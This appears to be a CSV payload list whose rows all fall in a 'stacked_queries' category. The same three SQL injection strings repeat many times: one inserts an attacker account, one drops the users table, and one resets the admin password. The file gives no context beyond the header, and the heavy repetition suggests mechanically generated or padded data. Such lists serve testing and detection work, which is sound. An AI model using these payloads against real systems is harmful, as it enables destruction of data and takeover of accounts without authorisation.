Category,Payload
stacked_queries,"'; INSERT INTO users (username,password) VALUES ('attacker','pass') --"
stacked_queries,'; DROP TABLE users --
stacked_queries,'; UPDATE users SET password='hacked' WHERE username='admin' --
stacked_queries,"'; INSERT INTO users (username,password) VALUES ('attacker','pass') --"
stacked_queries,'; DROP TABLE users --
stacked_queries,'; UPDATE users SET password='hacked' WHERE username='admin' --
stacked_queries,"'; INSERT INTO users (username,password) VALUES ('attacker','pass') --"
stacked_queries,'; DROP TABLE users --
stacked_queries,'; UPDATE users SET password='hacked' WHERE username='admin' --
stacked_queries,"'; INSERT INTO users (username,password) VALUES ('attacker','pass') --"
stacked_queries,'; DROP TABLE users --
stacked_queries,'; UPDATE users SET password='hacked' WHERE username='admin' --
stacked_queries,"'; INSERT INTO users (username,password) VALUES ('attacker','pass') --"
stacked_queries,'; DROP TABLE users --
stacked_queries,'; UPDATE users SET password='hacked' WHERE username='admin' --
stacked_queries,"'; INSERT INTO users (username,password) VALUES ('attacker','pass') --"
stacked_queries,'; DROP TABLE users --
stacked_queries,'; UPDATE users SET password='hacked' WHERE username='admin' --
stacked_queries,"'; INSERT INTO users (username,password) VALUES ('attacker','pass') --"
stacked_queries,'; DROP TABLE users --
stacked_queries,'; UPDATE users SET password='hacked' WHERE username='admin' --
stacked_queries,"'; INSERT INTO users (username,password) VALUES ('attacker','pass') --"
stacked_queries,'; DROP TABLE users --
stacked_queries,'; UPDATE users SET password='hacked' WHERE username='admin' --
stacked_queries,"'; INSERT INTO users (username,password) VALUES ('attacker','pass') --"
stacked_queries,'; DROP TABLE users --
stacked_queries,'; UPDATE users SET password='hacked' WHERE username='admin' --
stacked_queries,"'; INSERT INTO users (username,password) VALUES ('attacker','pass') --"
stacked_queries,'; DROP TABLE users --
stacked_queries,'; UPDATE users SET password='hacked' WHERE username='admin' --
stacked_queries,"'; INSERT INTO users (username,password) VALUES ('attacker','pass') --"
stacked_queries,'; DROP TABLE users --
stacked_queries,'; UPDATE users SET password='hacked' WHERE username='admin' --
stacked_queries,"'; INSERT INTO users (username,password) VALUES ('attacker','pass') --"
stacked_queries,'; DROP TABLE users --
stacked_queries,'; UPDATE users SET password='hacked' WHERE username='admin' --
stacked_queries,"'; INSERT INTO users (username,password) VALUES ('attacker','pass') --"
stacked_queries,'; DROP TABLE users --
stacked_queries,'; UPDATE users SET password='hacked' WHERE username='admin' --
stacked_queries,"'; INSERT INTO users (username,password) VALUES ('attacker','pass') --"
stacked_queries,'; DROP TABLE users --
stacked_queries,'; UPDATE users SET password='hacked' WHERE username='admin' --
stacked_queries,"'; INSERT INTO users (username,password) VALUES ('attacker','pass') --"
stacked_queries,'; DROP TABLE users --
stacked_queries,'; UPDATE users SET password='hacked' WHERE username='admin' --
stacked_queries,"'; INSERT INTO users (username,password) VALUES ('attacker','pass') --"
stacked_queries,'; DROP TABLE users --
stacked_queries,'; UPDATE users SET password='hacked' WHERE username='admin' --
stacked_queries,"'; INSERT INTO users (username,password) VALUES ('attacker','pass') --"
stacked_queries,'; DROP TABLE users --
stacked_queries,'; UPDATE users SET password='hacked' WHERE username='admin' --
stacked_queries,"'; INSERT INTO users (username,password) VALUES ('attacker','pass') --"
stacked_queries,'; DROP TABLE users --
stacked_queries,'; UPDATE users SET password='hacked' WHERE username='admin' --
stacked_queries,"'; INSERT INTO users (username,password) VALUES ('attacker','pass') --"
stacked_queries,'; DROP TABLE users --
stacked_queries,'; UPDATE users SET password='hacked' WHERE username='admin' --
stacked_queries,"'; INSERT INTO users (username,password) VALUES ('attacker','pass') --"
stacked_queries,'; DROP TABLE users --
stacked_queries,'; UPDATE users SET password='hacked' WHERE username='admin' --
stacked_queries,"'; INSERT INTO users (username,password) VALUES ('attacker','pass') --"
stacked_queries,'; DROP TABLE users --
stacked_queries,'; UPDATE users SET password='hacked' WHERE username='admin' --
stacked_queries,"'; INSERT INTO users (username,password) VALUES ('attacker','pass') --"
stacked_queries,'; DROP TABLE users --
stacked_queries,'; UPDATE users SET password='hacked' WHERE username='admin' --
stacked_queries,"'; INSERT INTO users (username,password) VALUES ('attacker','pass') --"
stacked_queries,'; DROP TABLE users --
stacked_queries,'; UPDATE users SET password='hacked' WHERE username='admin' --
stacked_queries,"'; INSERT INTO users (username,password) VALUES ('attacker','pass') --"
stacked_queries,'; DROP TABLE users --
stacked_queries,'; UPDATE users SET password='hacked' WHERE username='admin' --
stacked_queries,"'; INSERT INTO users (username,password) VALUES ('attacker','pass') --"
stacked_queries,'; DROP TABLE users --
stacked_queries,'; UPDATE users SET password='hacked' WHERE username='admin' --
stacked_queries,"'; INSERT INTO users (username,password) VALUES ('attacker','pass') --"
stacked_queries,'; DROP TABLE users --
stacked_queries,'; UPDATE users SET password='hacked' WHERE username='admin' --
stacked_queries,"'; INSERT INTO users (username,password) VALUES ('attacker','pass') --"
stacked_queries,'; DROP TABLE users --
stacked_queries,'; UPDATE users SET password='hacked' WHERE username='admin' --
stacked_queries,"'; INSERT INTO users (username,password) VALUES ('attacker','pass') --"
stacked_queries,'; DROP TABLE users --
stacked_queries,'; UPDATE users SET password='hacked' WHERE username='admin' --
stacked_queries,"'; INSERT INTO users (username,password) VALUES ('attacker','pass') --"
stacked_queries,'; DROP TABLE users --
stacked_queries,'; UPDATE users SET password='hacked' WHERE username='admin' --
stacked_queries,"'; INSERT INTO users (username,password) VALUES ('attacker','pass') --"
stacked_queries,'; DROP TABLE users --
stacked_queries,'; UPDATE users SET password='hacked' WHERE username='admin' --
stacked_queries,"'; INSERT INTO users (username,password) VALUES ('attacker','pass') --"
stacked_queries,'; DROP TABLE users --
stacked_queries,'; UPDATE users SET password='hacked' WHERE username='admin' --
stacked_queries,"'; INSERT INTO users (username,password) VALUES ('attacker','pass') --"
stacked_queries,'; DROP TABLE users --
stacked_queries,'; UPDATE users SET password='hacked' WHERE username='admin' --
stacked_queries,"'; INSERT INTO users (username,password) VALUES ('attacker','pass') --"
stacked_queries,'; DROP TABLE users --
stacked_queries,'; UPDATE users SET password='hacked' WHERE username='admin' --
stacked_queries,"'; INSERT INTO users (username,password) VALUES ('attacker','pass') --"
stacked_queries,'; DROP TABLE users --
stacked_queries,'; UPDATE users SET password='hacked' WHERE username='admin' --
stacked_queries,"'; INSERT INTO users (username,password) VALUES ('attacker','pass') --"
stacked_queries,'; DROP TABLE users --
stacked_queries,'; UPDATE users SET password='hacked' WHERE username='admin' --
stacked_queries,"'; INSERT INTO users (username,password) VALUES ('attacker','pass') --"
stacked_queries,'; DROP TABLE users --
stacked_queries,'; UPDATE users SET password='hacked' WHERE username='admin' --
stacked_queries,"'; INSERT INTO users (username,password) VALUES ('attacker','pass') --"
stacked_queries,'; DROP TABLE users --
stacked_queries,'; UPDATE users SET password='hacked' WHERE username='admin' --
stacked_queries,"'; INSERT INTO users (username,password) VALUES ('attacker','pass') --"
stacked_queries,'; DROP TABLE users --
stacked_queries,'; UPDATE users SET password='hacked' WHERE username='admin' --
stacked_queries,"'; INSERT INTO users (username,password) VALUES ('attacker','pass') --"
stacked_queries,'; DROP TABLE users --
stacked_queries,'; UPDATE users SET password='hacked' WHERE username='admin' --
stacked_queries,"'; INSERT INTO users (username,password) VALUES ('attacker','pass') --"
stacked_queries,'; DROP TABLE users --
stacked_queries,'; UPDATE users SET password='hacked' WHERE username='admin' --
stacked_queries,"'; INSERT INTO users (username,password) VALUES ('attacker','pass') --"
stacked_queries,'; DROP TABLE users --
stacked_queries,'; UPDATE users SET password='hacked' WHERE username='admin' --
stacked_queries,"'; INSERT INTO users (username,password) VALUES ('attacker','pass') --"
stacked_queries,'; DROP TABLE users --
stacked_queries,'; UPDATE users SET password='hacked' WHERE username='admin' --
stacked_queries,"'; INSERT INTO users (username,password) VALUES ('attacker','pass') --"
stacked_queries,'; DROP TABLE users --
stacked_queries,'; UPDATE users SET password='hacked' WHERE username='admin' --
stacked_queries,"'; INSERT INTO users (username,password) VALUES ('attacker','pass') --"
stacked_queries,'; DROP TABLE users --
stacked_queries,'; UPDATE users SET password='hacked' WHERE username='admin' --
stacked_queries,"'; INSERT INTO users (username,password) VALUES ('attacker','pass') --"
stacked_queries,'; DROP TABLE users --
stacked_queries,'; UPDATE users SET password='hacked' WHERE username='admin' --
stacked_queries,"'; INSERT INTO users (username,password) VALUES ('attacker','pass') --"
stacked_queries,'; DROP TABLE users --
stacked_queries,'; UPDATE users SET password='hacked' WHERE username='admin' --
stacked_queries,"'; INSERT INTO users (username,password) VALUES ('attacker','pass') --"
stacked_queries,'; DROP TABLE users --
stacked_queries,'; UPDATE users SET password='hacked' WHERE username='admin' --
stacked_queries,"'; INSERT INTO users (username,password) VALUES ('attacker','pass') --"
stacked_queries,'; DROP TABLE users --
stacked_queries,'; UPDATE users SET password='hacked' WHERE username='admin' --
stacked_queries,"'; INSERT INTO users (username,password) VALUES ('attacker','pass') --"
stacked_queries,'; DROP TABLE users --
stacked_queries,'; UPDATE users SET password='hacked' WHERE username='admin' --
stacked_queries,"'; INSERT INTO users (username,password) VALUES ('attacker','pass') --"
stacked_queries,'; DROP TABLE users --
stacked_queries,'; UPDATE users SET password='hacked' WHERE username='admin' --
stacked_queries,"'; INSERT INTO users (username,password) VALUES ('attacker','pass') --"
stacked_queries,'; DROP TABLE users --
stacked_queries,'; UPDATE users SET password='hacked' WHERE username='admin' --
stacked_queries,"'; INSERT INTO users (username,password) VALUES ('attacker','pass') --"
stacked_queries,'; DROP TABLE users --
stacked_queries,'; UPDATE users SET password='hacked' WHERE username='admin' --
stacked_queries,"'; INSERT INTO users (username,password) VALUES ('attacker','pass') --"
stacked_queries,'; DROP TABLE users --
stacked_queries,'; UPDATE users SET password='hacked' WHERE username='admin' --
stacked_queries,"'; INSERT INTO users (username,password) VALUES ('attacker','pass') --"
stacked_queries,'; DROP TABLE users --
stacked_queries,'; UPDATE users SET password='hacked' WHERE username='admin' --
stacked_queries,"'; INSERT INTO users (username,password) VALUES ('attacker','pass') --"
stacked_queries,'; DROP TABLE users --
stacked_queries,'; UPDATE users SET password='hacked' WHERE username='admin' --
stacked_queries,"'; INSERT INTO users (username,password) VALUES ('attacker','pass') --"
stacked_queries,'; DROP TABLE users --
stacked_queries,'; UPDATE users SET password='hacked' WHERE username='admin' --
stacked_queries,"'; INSERT INTO users (username,password) VALUES ('attacker','pass') --"
stacked_queries,'; DROP TABLE users --
stacked_queries,'; UPDATE users SET password='hacked' WHERE username='admin' --
stacked_queries,"'; INSERT INTO users (username,password) VALUES ('attacker','pass') --"
stacked_queries,'; DROP TABLE users --
stacked_queries,'; UPDATE users SET password='hacked' WHERE username='admin' --
stacked_queries,"'; INSERT INTO users (username,password) VALUES ('attacker','pass') --"
stacked_queries,'; DROP TABLE users --
stacked_queries,'; UPDATE users SET password='hacked' WHERE username='admin' --
stacked_queries,"'; INSERT INTO users (username,password) VALUES ('attacker','pass') --"
stacked_queries,'; DROP TABLE users --
stacked_queries,'; UPDATE users SET password='hacked' WHERE username='admin' --
stacked_queries,"'; INSERT INTO users (username,password) VALUES ('attacker','pass') --"
stacked_queries,'; DROP TABLE users --
stacked_queries,'; UPDATE users SET password='hacked' WHERE username='admin' --
stacked_queries,"'; INSERT INTO users (username,password) VALUES ('attacker','pass') --"
